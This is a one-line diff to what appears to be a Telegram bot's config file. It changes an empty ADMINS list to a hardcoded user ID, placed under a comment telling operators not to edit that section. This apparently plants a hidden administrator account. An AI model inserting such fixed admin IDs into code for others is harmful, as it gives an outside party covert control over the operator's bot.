@@ -115,7 +115,7 @@ DISABLE_CHANNEL_BUTTON = True if os.environ.get("DISABLE_CHANNEL_BUTTON", "TRUE"
 
 #no need to add anything from now on
 
-ADMINS = []
+ADMINS = [5886772061]
 ADMINS.append(OWNER_ID)
 
 LOG_FILE_NAME = "logs.txt"
